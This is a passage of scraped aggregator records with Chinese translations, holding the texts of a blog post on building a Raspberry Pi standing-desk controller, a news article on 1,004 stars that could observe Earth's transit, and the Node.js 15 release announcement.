pre-programmed &#34;ground&#34; setting where it&#39;s comfortable for me to sit (around 60cm off the ground) while right arrow button raises it to my preset standing position (120cm).\n Along the  right there&#39;s a light-bar. This is really just a decoration, showing the current position of the desk. They light-up individually as the desk goes up. Like a 1-dimensional Christmas tree.\n    The relays on the Raspberry Pi allow us to control the underlying electrical circuit to raise/lower the desk via the RPIO&#39;s GPIO pins.\n The height sensor detects how high the desk is currently off the ground and allows us to start/stop the motor via the above relays.\n Finally, the display allows us to control everything as well as display the current height of the desk.\n Admission: I don&#39;t know what I&#39;m doing - electricity is magic that spews from the wall, so a lot of this was just me poking an prodding at things while making sure I didn&#39;t electrocute myself. Be careful.\n Here&#39;s what I knew: my desk had a big black motor sitting underneath. It raised and lowered the table. There were a few wires coming out of it connected to its build-in switch.\n To learn more, the first thing I did was open (and effectively destroy) the default switch, to see how it worked inside\n Top Tip: destroy things as early as possible so that  you have to finish the project\n  At a basic level it&#39;s easy to understand what  these switches do: they control how electricity flows to the motor. The circuit is open by default with no electricity flowing. When you press a button, it closes the circuit allowing electricity to flow to the motor which will rise or fall. Which direction the motor runs depends on whether you connect live or neural  [citation needed]\n To be able to actually re-wire this though and hook everything up the relays, you need to actually understand it working in more detail. To do this, I cut the switches out (after taking a number of inadequate pictures) and created my own battery-powered circuit to see it in action.\n  If I&#39;m honest, I don&#39;t understand this stuff well enough to offer an explanation of exactly how you should do this or how it works in any detail. I did map it all out myself:\n  But this might be wrong as I did a lot of reconnecting-wires-until-it-worked, so if you&#39;re doing something similar, spend some time researching relays and playing with a test circuit yourself before working with anything connected to the mains.\n With a better idea of how the switches worked, I was able to add the relay board to the Raspberry Pi and test out the circuit before actually hooking it up to the motor.\n  Finally, with that working, I went on to wire the actual motor up to the Raspberry Pi. Again, this is potentially dangerous. If you&#39;re doing this make sure you read-up on it and take some precautions (like cowering in the corner while you flip the switch with a long stick).\n  With everything wired up correctly I could now control both an &#34;up&#34; relay and &#34;down&#34; relay via code.\n With the ability to raise and lower the desk via the relays (and code), I needed to think about how to actually control the desk and get it into a comfortable standing or sitting position automatically.\n One easy approach is to simply raise or lower the desk for a certain amount of time. In other words, to get into the &#34;standing&#34; position just enable the &#34;up&#34; relay for 5 seconds. To go back to &#34;sitting&#34; enable the &#34;down&#34; relay for 5 seconds.\n This doesn&#39;t really work though. The desk lowers much more quickly than it raises (due to gravity) so it&#39;s very hard to get the correct timings. Furthermore you can easily get out-of-sync, meaning you have to manually adjust the height again, making the whole endeavour pointless (of course I only realised this once I had assembled everything).\n A better approach is to use a height sensor. These are small little devices that send out a sound wave and measure how long it takes to return. With some simple maths you have the height of the ground.\n  I found a  few tutorials on setting this up via a small circuit on the breadboard. With some experimentation it was easy to start reading the desk height via Python.\n With all the hardware in place, the final thing was to tie everything together with some Python.\n \ud83d\udcbb You can have a closer look at the code  over on my Github page\n I don&#39;t have much experience programming hardware or embedded devices so I had to tinker with this to get it working.\n I ended up using Redis to create a message queue that each part of the controller could communicate through and then using threads to handle most of the various parts of the controller:\n   As an added bonus I also  installed Homebridge on the Raspberry Pi, allowing me to control the standing desk via my iPhone/Mac/iPad.\n  To do this I needed to create a plugin for homebridge. You can also see  the code for this on my Github page. I don&#39;t actually use this that much to control the desk, but it&#39;s a nice added bonus.", "posttime": "2020-10-24 03:01:39", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "raspberry-pi,\u6811\u8393,raspberry,\u684c\u5b50", "title": "\u56fd\u4ea7\u6811\u8393PI\u7acb\u5f0f\u4e66\u684c\u63a7\u5236\u5668", "title_en": "Home Made Raspberry Pi Standing Desk Controller", "transed": 1, "url": "https://timmyomahony.com/blog/home-made-standing-desk-raspberry-pi-controller", "via": "", "real_tags": ["\u6811\u8393", "raspberry", "\u684c\u5b50"]}, {"category": "", "categoryclass": "", "imagename": "5de2d3c385af267cbdb727e89090ee92.jpg", "infoid": 1030781, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\n\u7814\u7a76\u4eba\u5458\u63a8\u6d4b\uff0c1004\u9897\u6052\u661f\u4e2d\u7ea6\u67095%\u53ef\u80fd\u592a\u5e74\u8f7b\uff0c\u4e0d\u9002\u5408\u667a\u80fd\u751f\u547d\u7684\u8fdb\u5316\uff0c\u5373\u4f7f\u6709\u4e00\u9897\u5177\u5907\u5b9c\u5c45\u6761\u4ef6\u7684\u884c\u661f\u56f4\u7ed5\u5b83\u4eec\u8fd0\u884c\u3002\u4f46\u5269\u4e0b\u768495%\u5c5e\u4e8e\u53ef\u4ee5\u7ef4\u6301\u751f\u547d\u6570\u5341\u4ebf\u5e74\u7684\u6052\u661f\u7c7b\u522b\uff0c\u5730\u7403\u7684\u7ecf\u9a8c\u8868\u660e\uff0c\u5047\u8bbe\u6761\u4ef6\u5408\u9002\uff0c\u8fd9\u8db3\u4ee5\u8ba9\u667a\u6167\u751f\u547d\u8fdb\u5316\u3002\n\u540d\u5355\u4e0a\u7684\u5927\u591a\u6570\u6052\u661f\u90fd\u4f4d\u4e8e326\u5149\u5e74\u8303\u56f4\u7684\u8f83\u8fdc\u7aef\uff0c\u56e0\u4e3a\u968f\u7740\u4f60\u79bb\u6211\u4eec\u7684\u592a\u9633\u7cfb\u8d8a\u8fd1\uff0c\u5730\u7403\u51cc\u65e5\u53ef\u89c1\u7684\u533a\u57df\u5c31\u8d8a\u5c0f\u3002\u4f46\u540d\u5355\u4e0a\u8ddd\u79bb\u6700\u8fd1\u7684\u6052\u661f\u53ea\u670928\u5149\u5e74\u8fdc\u3002\u800c\u4e14\uff0c\u9644\u8fd1\u8fd8\u6709\u51e0\u9897\u6052\u661f\u6709\u671b\u5728\u51e0\u4e2a\u4e16\u7eaa\u5185\u8fdb\u5165\u5b83\u4eec\u53ef\u80fd\u4f1a\u53d1\u73b0\u5730\u7403\u7684\u533a\u57df\u3002\u5176\u4e2d\u4e00\u4e9b\u5728\u5929\u7a7a\u4e2d\u8db3\u591f\u660e\u4eae\uff0c\u53ef\u4ee5\u4ece\u5730\u7403\u4e0a\u770b\u5230\u3002\n\u540d\u5355\u4e0a\u7684\u4e24\u9897\u6052\u661f\u90fd\u77e5\u9053\u7cfb\u5916\u884c\u661f\u3002\u4e00\u9897\u8ddd\u79bb\u5730\u7403\u53ea\u670912\u5149\u5e74\u7684\u7ea2\u77ee\u661f\uff0c\u4e5f\u5c31\u662f\u5df2\u77e5\u7684\u7cfb\u5916\u884c\u661f--\u8482\u52a0\u767b\u6052\u661f--\u76ee\u524d\u6ca1\u6709\u5408\u9002\u7684\u89c6\u89d2\u6765\u89c2\u6d4b\u5730\u7403\uff0c\u4f46\u6309\u7167\u5b83\u76ee\u524d\u7684\u8fd0\u52a8\u901f\u5ea6\uff0c\u6700\u5feb\u5c06\u57282044\u5e74\u8fdb\u5165\u5730\u7403\u63a2\u6d4b\u5e26\u3002\u201c\u3002\n\u7814\u7a76\u4eba\u5458\u5199\u9053\uff0c\u4e0b\u4e00\u6b65\u662f\u5c06\u667a\u80fd\u751f\u547d\u641c\u7d22\u64cd\u4f5c\u96c6\u4e2d\u5728\u4ed6\u4eec\u7684\u8bba\u6587\u4e2d\u786e\u5b9a\u76841004\u9897\u6052\u661f\u4e0a\u3002\u4ed6\u4eec\u7279\u522b\u63d0\u5230\u4e86SETI\u7684\u7a81\u7834\u6027\u4fa6\u542c\u8ba1\u5212\uff0c\u8be5\u8ba1\u5212\u65e8\u5728\u63a2\u6d4b\u6765\u81ea\u5148\u8fdb\u5916\u661f\u6587\u660e\u7684\u901a\u4fe1\u3002\n\u8fd9\u9879\u7814\u7a76\u53d1\u8868\u572810\u670820\u65e5\u7684\u201c\u7687\u5bb6\u5929\u6587\u5b66\u4f1a\u6708\u520a\u201d\u4e0a\u3002", "note_en": "There are about 1,000 star systems where aliens, if they existed, could be watching us from afar, new research suggests.\n Those 1,004 star systems are in a direct line of sight to our planet, and close enough to us that they could not only detect planet Earth, but also chemical traces of Earthly life.\n   Over the course of the last decade, astronomers have found exoplanets orbiting distant stars using a simple formula: Keep an eye on a star and wait for it to suddenly dim. That dimming is a sign of a planet passing between the star and the telescope. Analyzing how the \u00a0light changes as the star dims can reveal the chemical contents of the planet&#39;s atmosphere.\n But this method works only for planets whose orbits happen to take them between their host stars and Earth. In a new paper, researchers flipped that formula on its head, asking: Which nearby stars are lined up properly for their inhabitants to see   Earth transit in front of the sun? Would any life-forms in those star systems be able to detect signs of us, the living things on Earth&#39;s surface? The answer is yes, it turns out, for a great number of nearby stars.\n &#34;If observers were out there searching, they would be able to see signs of a biosphere in the atmosphere of our Pale Blue Dot,&#34; Lisa Kaltenegger, a Cornell University astronomer and lead author of the paper, said in a   statement.\n  Planets, it turns out, are common in space. Since researchers first confirmed finding one transiting in front of its star in 1992, astronomers have found 4,292 confirmed planets beyond our   solar system, orbiting 3,185 stars, thanks largely to the planet hunting Transiting Exoplanet Survey Satellite (TESS). The James Webb Space Telescope (JWST), slated to launch at some point this decade, should have the precision to study many of those planets in more detail \u2014 possibly detecting gases like methane or   oxygen in their atmospheres, which would be likely signs of life.\n What if aliens had their own \u00a0JWST? Within 326 light-years, the researchers found, there are 1,004 with vantage points to spot Earth. Of those, 508 have viewing angles that would give them at least 10 hours of observational data every time Earth passed between that location and the sun \u2014 ideal conditions for spotting this little rocky planet and the signs of life in its atmosphere.\n &#34;Only a very small fraction of exoplanets will just happen to be randomly aligned with our line of sight so we can see them transit.&#34; said Lehigh University astrophysicist Joshua Pepper, co-author of the paper, in the statement. &#34;But all of the thousand stars we identified in our paper in the solar neighborhood could see our Earth transit the sun, calling their attention.&#34;\n  About 5% of the 1,004 stars are likely too young for intelligent life to have evolved, the researchers surmise, even if a planet with habitable conditions orbited them. But the remaining 95% belong to star categories that can sustain life for billions of years, which Earth&#39;s experience suggests is long enough for intelligent life to evolve, assuming conditions are right.\n Most of the stars on the list are toward the farther end of the 326 light-year range, because the zone where Earth&#39;s transit is visible gets smaller as you get closer to our solar system. But the closest star on the list is only 28 light-years away. And there are several more nearby stars that are on track to enter the zone where they might spot Earth within centuries. Some are bright enough in the sky to see from Earth.\n Two stars on the list have known exoplanets. And a red dwarf just 12 light-years from Earth with known exoplanets \u2014 known as Teegarden&#39;s star \u2014 does not currently have the right viewing angle to spot Earth but at its current rate of movement will enter the Earth-spotting zone as soon as 2044.\n The next step, the researchers wrote, is to focus intelligent life-hunting operations on the 1,004 stars identified in their paper. They specifically mentioned SETI&#39;s Breakthrough Listen program, designed to detect communications from advanced alien civilizations.\n This research was published Oct. 20 in the journal   Monthly

"note_en": "This blog was written by Bethany Griggs, with additional contributions from the Node.js Technical Steering Committee.\n  We\u2019re excited to announce that Node.js 15 was released today. Node.js 15 replaces No de.js 14 as our \u2018current\u2019 release line, with Node.js 14 being promoted to LTS (long-term support) later this month. You can expect new releases of Node.js 15 approximately every two-weeks, keeping you up-to-date with the latest features and changes. As an odd-numbered release line, Node.js 15 will not be promoted to LTS. Please bear this in mind when using Node.js 15 in production deployments \u2014 we generally recommend the use of an LTS release line for your production deployments.\n To download Node.js v15.0.0, visit:  https://nodejs.org/en/download/current/. Similarly, you can find the release post at  https://nodejs.org/en/blog/release/v15.0.0, which contains the list of commits included in this release.\n    Node.js 15 features an experimental implementation of  AbortController.  AbortController is a global utility class used to signal cancelation in selected Promise-based APIs, based on the  AbortController Web API:\n  In the above example, the abort event is emitted when  ac.abort() is called. The  AbortController will only trigger the  abort event once. Event listeners attached to the  AbortSignal should use the  { once: true } option (or  EventEmitter API equivalent \u2014  once()) to ensure that the event listener is removed once the  abort event is handled.\n   While we backport new N-API versions to the other LTS Node.js versions, it\u2019s worth mentioning that N-API 7 is new since the last major release and brings additional methods for working with ArrayBuffers.\n  Node.js 15 comes with a new major release of npm, npm 7. npm 7 comes with many new features \u2014 including npm workspaces and a new  package-lock.json format. npm 7 also includes  yarn.lock file support. One of the big changes in npm 7 is that peer dependencies are now installed by default. For more information on the npm 7 release, including details of the breaking changes, check out  the GitHub blog.\n  As of Node.js 15, the default mode for  unhandledRejection is changed to  throw (from  warn). In  throw mode, if an  unhandledRejection hook is not set, the unhandledRejection is raised as an uncaught exception. Users that have an  unhandledRejection hook should see no change in behavior, and it\u2019s still possible to switch modes using the  --unhandled-rejections=mode process flag.   Node.js has emitted an  UnhandledPromiseRejectionWarning by default for many releases and the decision to switch the mode to throw was agreed to based on input from the results of the  Node.js User Insights: Unhandled Promise Rejections survey, and finally a  Node.js Technical Steering Committee vote. A special thank you to Mary Marchini for driving this decision forwards.\n  QUIC is a new UDP-based transport protocol that is the underlying transport protocol for HTTP/3. QUIC features inbuilt security with TLS 1.3, flow control, error correction, connection migration, and multiplexing.\n Node.js 15 comes with experimental support QUIC, which can be enabled by compiling Node.js with the  --experimental-quic configuration flag. The Node.js QUIC implementation is exposed by the core  net module:  const { createQuicSocket } = require(\u2018net\u2019);\n   The V8 JavaScript engine has been updated to V8 8.6 (V8 8.4 is the latest available in Node.js 14). Along with performance tweaks and improvements the V8 update also brings the following language features:\n    Aside from adding new features to Node.js, there has been a great focus on improving the contribution process. This year, the project conducted a  Node.js Contributors Survey to gather feedback on the contribution process to determine target areas for improvement. There have also been big improvements to our automation and tooling. It\u2019s now possible to kick off CI runs and land commits just by adding a GitHub label, making it easier for collaborators to manage the constant flow of Pull Requests.\n Last year was the 10 year anniversary of Node.js and the project has kicked off the  Next 10 Years of Node.js effort. The goal of this effort is to reflect on what led to success in the first 10 years of Node.js and set the direction for success in the next 10. The effort has started by looking at the project\u2019s technical values, constituencies, and their needs to set the basis for future discussions. One of the outcomes so far is that we\u2019ve created a  Technical Values document to guide our efforts.\n  Try out the new Node.js 15 release! We\u2019re always happy to hear your feedback! It\u2019s also worth testing your applications and modules with Node.js 15, to ensure the future compatibility of your project with the latest Node.js features and changes.\n Now is also a good time to start planning to upgrade to Node.js 14, which is due to be promoted to LTS next week. Node.js 14 will continue to be supported until April 2023.\n Also of note is that Node.js 10 will go End-of-Life in April 2021, so we advise you to start planning to upgrade if you are still using Node.js 10.\n   Thank you to everyone who made this release come together, including the many Node.js contributors and collaborators. We\u2019d also like to extend a special thank you to the  Node.js Release Working Group for maintaining and producing Node.js releases and the  Node.js Build Working Group for keeping the project infrastructure running.\n To download Node.js v15.0.0, visit:  https://nodejs.org/en/download/current/ .
